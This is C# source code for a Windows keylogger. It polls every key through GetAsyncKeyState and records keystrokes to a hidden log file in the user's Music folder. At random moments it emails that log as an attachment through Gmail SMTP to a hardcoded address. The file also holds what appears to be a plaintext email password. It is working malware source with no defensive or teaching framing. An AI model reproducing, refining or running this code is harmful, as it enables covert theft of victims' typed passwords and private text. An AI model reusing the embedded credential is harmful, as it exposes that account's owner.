using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;

namespace KL
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        static void LoggedKeys()
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filepath = filepath + @"\LogsFolder\";

            if(!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + "LoggedKeys.txt");

            if(!File.Exists(path))
            {
                using(StreamWriter sw = File.CreateText(path))
                {

                }
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while(true)
            {
                Thread.Sleep(10);
                for(Int32 i = 0;  i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if(key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                            sw.Close();
                            Random rand = new Random();
                            int randomNumber = rand.Next(1, 21);
                            if (randomNumber == 1)
                            {
                                SendMail();
                            }
                        }
                        break;
                    }
                }
                break;
            }
            LoggedKeys();
          
        }

        static void SendMail()
        {
            String NewFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            string NewFilePath2 = NewFilePath + @"\LogsFolder\LoggedKeys.txt";

            DateTime dateTime = DateTime.Now;
            string subtext = "Loggedfiles ";
            subtext += dateTime;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress("wade2slick@gmail.com");
            LOGMESSAGE.To.Add("wade2slick@gmail.com");
            LOGMESSAGE.Subject = subtext;

            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("wade2slick@gmail.com", "alchurman1");

            string newfile = File.ReadAllText(NewFilePath2);

            string attachmentTextFile = NewFilePath + @"\LogsFolder\attachmentTextFile.txt";
            File.WriteAllText(attachmentTextFile, newfile);
            LOGMESSAGE.Attachments.Add(new Attachment(NewFilePath2));
            LOGMESSAGE.Body = subtext;
            client.Send(LOGMESSAGE);
            LOGMESSAGE = null;

        }





        static void Main(string[] args)
        {
            
            Random rand = new Random();
            int randomNumber = rand.Next(1, 21);
            if (1 == 1)
            {
               
              //SendMail();
            }

            LoggedKeys();
            
           
           
           

        }




    }
}
